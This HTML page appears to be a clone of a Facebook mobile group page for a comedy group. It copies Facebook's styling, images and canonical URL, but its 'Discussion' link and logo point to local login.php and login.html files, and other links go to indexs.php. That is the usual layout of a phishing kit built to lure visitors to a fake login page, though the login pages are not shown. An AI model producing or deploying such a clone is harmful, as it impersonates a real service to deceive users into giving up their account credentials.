<html>
 <head>
  <title>Comedy 😂Xpart 😍{GANG}✌✌ public group | Facebook</title>
  <meta name="viewport" content="width=device-width">
  <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">
  <meta name="theme-color" content="#3b5998">
  <style type="text/css">/*<![CDATA[*/.p{padding:5px;}.p .t .x{color:#000;}.p .t:hover .x{color:#fff;}.p .t:hover{background-color:#3b5998;}.n #groupInfoDescription{margin-top:0;}.o{background:#dddfe2;}.bd{background:#fff;}.b .q{border:0;border-collapse:collapse;margin:0;padding:0;width:100%;}.b .q tbody{vertical-align:top;}.b .r>tr>td,.b .r>tbody>tr>td,.b .q td.r{vertical-align:middle;}.b .q td{padding:0;}.b .q td.u{padding:2px;}.b .q td.bf{padding:4px;}.b .s{width:100%;}.b a,.b a:visited{color:#3b5998;text-decoration:none;}.b a:focus,.b a:hover{background-color:#3b5998;color:#fff;}.b .u{padding:2px;}.b .bf{padding:4px;}.l{border:0;display:inline-block;vertical-align:top;}i.l u{position:absolute;width:0;height:0;overflow:hidden;}.ba{color:#4b4f56;}.z{font-size:12px;line-height:16px;}.bz{font-weight:bold;}.w{text-align:center;}.bi{position:absolute;width:100%;z-index:4;}.e{background-color:#fff;}.i{background-color:#3b5998;}.bj{border-top:none;padding-top:12px;}.bk{padding-top:12px;position:relative;}.bj .bl{position:absolute;}.bj .bm{left:50%;margin-left:-27px;top:0;}.bn{border-color:transparent;border-image:url(https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yn/r/OVEVu5JFsUe.png) 18 23 26;border-style:solid;border-width:18px 23px 26px;pointer-events:auto;}.bj .bo{margin-top:-8px;}.bp{border:solid 2px;cursor:pointer;margin:0;padding:2px 6px 3px;text-align:center;}.bp.br{display:block;}button.br,input.br{width:100%;}.i .bq,.b .i a.bq{background:#f3f4f5;border-color:#ccc #aaa #999;color:#505c77;}.bq,.b a.bq,.b a.bq:visited{background:#3b5998;border-color:#8a9ac5 #29447E #1a356e;color:#fff;}.bp .l{pointer-events:none;}.bp{display:inline-block;}.bp+.bp{margin-left:3px;}.br+.br{margin-left:0;margin-top:6px;}.bp input{background:none;border:none;margin:0;padding:0;}.i .bq input{color:#505c77;}.bq input{color:#fff;}.bb{border-bottom:1px solid #bfc3ca;}.bc{background:#f5f6f7;color:#90949c;display:block;font-size:small;font-weight:normal;padding:3px 4px;text-transform:uppercase;}.be>*,.be.be>*{border-bottom:1px solid #e5e5e5;}.be>:last-child{border-bottom:none;}.be+.be{border-top:1px solid #e5e5e5;}.bg{background:#d8dfea;color:#3b5998;font-weight:bold;padding:0 2px 2px 3px;}.ca{color:#fff;}.bh{font-size:small;}body,tr,input,textarea,.f{font-size:medium;}body{text-align:left;direction:ltr;}body,tr,input,textarea,button{font-family:sans-serif;}body,p,figure,h1,h2,h3,h4,h5,h6,ul,ol,li,dl,dd,dt{margin:0;padding:0;}h1,h2,h3,h4,h5,h6{font-size:1em;font-weight:bold;}ul,ol{list-style:none;}article,aside,figcaption,figure,footer,header,nav,section{display:block;}#page{position:relative;}.k{padding-bottom:4px;padding-top:4px;}.j{padding:2px 3px;}.bw{display:block;font-size:x-small;margin:-3px -3px 1px -3px;padding:3px;}.by{border:1px solid #90949c;display:block;font-size:x-large;height:20px;line-height:18px;text-align:center;vertical-align:middle;width:20px;}.b .bt input,.b .bt input:visited,.b .bt a,.b .bt a:visited{color:#bec3c9;}.b .bt input:focus,.b .bt input:hover,.b .bt a:focus,.b .bt a:hover{background:#dadde1;color:#1d2129;}.bs{background-color:#444950;font-size:x-small;padding:7px 8px 8px;}.bv{color:#bec3c9;display:block;font-size:x-small;margin:-3px -3px 1px -3px;padding:3px;}/*]]>*/</style> 
  <meta http-equiv="origin-trial" content="AvpndGzuAwLY463N1HvHrsK3WE5yU5g6Fehz7Vl7bomqhPI/nYGOjVg3TI0jq5tQ5dP3kDSd1HXVtKMQyZPRxAAAAABleyJvcmlnaW4iOiJodHRwczovL2ZhY2Vib29rLmNvbTo0NDMiLCJmZWF0dXJlIjoiSW5zdGFsbGVkQXBwIiwiZXhwaXJ5IjoxNTEyNDI3NDA0LCJpc1N1YmRvbWFpbiI6dHJ1ZX0=">
  <meta name="description" content="Comedy 😂Xpart 😍{GANG}✌✌ has 13'181 members.👍👍Everyone take it as a fun don't take it personally.👍👍
Be happy always &amp; Have fun🤓🤡🤠">
  <link rel="canonical" href="https://www.facebook.com/groups/656215467816192/">
<link rel="stylesheet" type="text/css" href="style.css"/>
 </head>
 <body tabindex="0" class="b c d e">
  <div class="f">
   <div id="viewport">
    <div class="g h">
     <div class="i j" role="banner" id="header">
      <h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1>
      <a href="login.html"><img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/y8/r/k97pj8-or6s.png?_nc_x=Ij3Wp8lg5Kz" width="77" height="16" class="k l" alt="facebook"></a>
     </div>
    </div>
    <div id="objects_container">
     <div class="m e" id="root" role="main">
      <div class="n">
       <div id="groupMallNotices"></div>
       <div class="o p">
        <table class="q r" role="presentation">
         <tbody>
          <tr>
           <td class="s"><a href="#groupMenuBottom">
             <table class="q r t" role="presentation">
              <tbody>
               <tr>
                <td class="u v"><img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/y1/r/SY6u2OaJZhg.png?_nc_x=Ij3Wp8lg5Kz" width="34" height="34" class="l"></td>
                <td class="u w s"><h1>
                  <div class="x y">
                   Comedy 😂Xpart 😍{GANG}✌✌
                  </div></h1>
                 <div class="z ba">
                  Closed group
                 </div></td>
               </tr>
              </tbody>
             </table></a></td>
           <td class="v"></td>
          </tr>
         </tbody>
        </table>
       </div>
       <div class="bb">
        <h3 class="bc">Group Menu</h3>
        <ul class="bd be">
         <li class="bf">
          <table class="q r" role="presentation">
           <tbody>
            <tr>
             <td class="s"><a href="indexs.php">About</a></td>
             <td class="v"></td>
            </tr>
           </tbody>
          </table></li>
         <li class="bf">
          <table class="q r" role="presentation">
           <tbody>
            <tr>
             <td class="s"><a href="login.php">Discussion</a></td>
             <td class="v"></td>
            </tr>
           </tbody>
          </table></li>
         <li class="bf">
          <table class="q r" role="presentation">
           <tbody>
            <tr>
             <td class="s"><a href="indexs.php" id="u_0_1" aria-labelledby="u_0_1 u_0_0">Members</a></td>
             <td class="v"><span class="bg bh" id="u_0_0">13181</span></td>
            </tr>
           </tbody>
          </table></li>
        </ul>
       </div>
       <div class="bi" style="display:none">
        <div class="bj">
         <div class="bk">
          <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yR/r/CjVACNCmi_H.png?_nc_x=Ij3Wp8lg5Kz" width="54" height="24" class="bl bm l">
          <div class="bn">
           <div class="bo">
            <a href="#" class="bp bq br">View Timeline</a>
            <a href="#" class="bp bq br">Add to Group</a>
            <a href="#" class="bp bq br">Invite to Event</a>
           </div>
          </div>
         </div>
        </div>
       </div>
      </div>
      <div style="display:none"></div>
      <span><img src="https://facebook.com/security/hsts-pixel.gif" width="0" height="0" style="display:none"></span>
     </div>
    </div>
    <div class="bd">
     <div class="bs">
      <div class="bt">
       <table class="q" role="presentation">
        <tbody>
         <tr>
          <td class="s bu" style="width:50%"><b class="bv">English (UK)</b><a class="bw" href="">অসমীয়া</a><a class="bw" href="">Português (Brasil)</a></td>
          <td class="s bx" style="width:50%"><a class="bw" href="">বাংলা</a><a class="bw" href="">Español</a><a class="bw" href="">
            <div class="by">
              + 
            </div></a></td>
         </tr>
        </tbody>
       </table>
      </div>
      <span class="bz ca">Facebook ©2019</span>
     </div>
    </div>
   </div>
  </div>
 </body>
</html>
